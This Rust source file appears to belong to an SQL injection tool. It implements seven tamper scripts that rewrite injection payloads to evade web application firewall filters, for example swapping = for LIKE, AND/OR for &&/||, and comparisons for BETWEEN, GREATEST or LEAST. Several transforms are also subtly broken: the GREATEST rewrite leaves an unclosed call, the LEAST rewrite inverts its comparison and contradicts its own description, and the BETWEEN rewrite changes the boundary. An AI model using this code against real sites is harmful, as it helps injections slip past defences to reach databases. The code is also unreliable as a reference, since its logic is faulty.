use super::TamperScript;

pub struct TamperEqualToLike;
impl TamperScript for TamperEqualToLike {
    fn name(&self) -> &'static str {
        "equal_to_like"
    }
    fn description(&self) -> &'static str {
        "Replace = with LIKE for filters blocking = operator"
    }
    fn tamper(&self, payload: &str) -> String {
        let mut out = String::with_capacity(payload.len() + 16);
        let bytes = payload.as_bytes();
        let mut i = 0;
        while i < bytes.len() {
            if bytes[i] == b'=' {
                let prev = if i > 0 { bytes[i - 1] } else { 0 };
                if !matches!(prev, b'>' | b'<' | b'!' | b'=') {
                    out.push_str(" LIKE ");
                    i += 1;
                    continue;
                }
            }
            out.push(bytes[i] as char);
            i += 1;
        }
        out
    }
}

pub struct TamperLogicalOperators;
impl TamperScript for TamperLogicalOperators {
    fn name(&self) -> &'static str {
        "logical_operators"
    }
    fn description(&self) -> &'static str {
        "AND->&& / OR->|| (MySQL short-circuit operators)"
    }
    fn tamper(&self, payload: &str) -> String {
        payload.replace(" AND ", " && ").replace(" OR ", " || ")
    }
}

pub struct TamperScientificNotation;
impl TamperScript for TamperScientificNotation {
    fn name(&self) -> &'static str {
        "scientific_notation"
    }
    fn description(&self) -> &'static str {
        "Replace numeric comparisons with scientific notation (1e0=1e0)"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace(" 1=1", " 1e0=1e0")
            .replace(" 1=2", " 1e0=2e0")
    }
}

pub struct TamperBetweenOperator;
impl TamperScript for TamperBetweenOperator {
    fn name(&self) -> &'static str {
        "between_operator"
    }
    fn description(&self) -> &'static str {
        "Replace > comparisons with BETWEEN to bypass operator filters"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace(">0", "BETWEEN 0 AND 9999")
            .replace(">64", "BETWEEN 65 AND 127")
    }
}

pub struct TamperGreatest;
impl TamperScript for TamperGreatest {
    fn name(&self) -> &'static str {
        "greatest"
    }
    fn description(&self) -> &'static str {
        "Replace > with GREATEST: x>0 -> GREATEST(x,1)=x"
    }
    fn tamper(&self, payload: &str) -> String {
        let mut out = payload.to_string();
        out = out.replace(">0", ">/**/0");
        out = out.replace(" > ", " GREATEST(");
        out
    }
}

pub struct TamperLeast;
impl TamperScript for TamperLeast {
    fn name(&self) -> &'static str {
        "least"
    }
    fn description(&self) -> &'static str {
        "Replace < comparisons with LEAST(): x<32 -> LEAST(x,32)=LEAST(x,32)"
    }
    fn tamper(&self, payload: &str) -> String {
        let re = regex::Regex::new(r"(\w+)<(\d+)").unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("LEAST({},{})={}", &caps[1], &caps[2], &caps[2])
        })
        .to_string()
    }
}

pub struct TamperSymbolicLogical;
impl TamperScript for TamperSymbolicLogical {
    fn name(&self) -> &'static str {
        "symboliclogical"
    }
    fn description(&self) -> &'static str {
        "NOT->!, AND->&&, OR->|| (MySQL symbolic operators)"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace(" AND ", " && ")
            .replace(" OR ", " || ")
            .replace("NOT ", "!")
    }
}
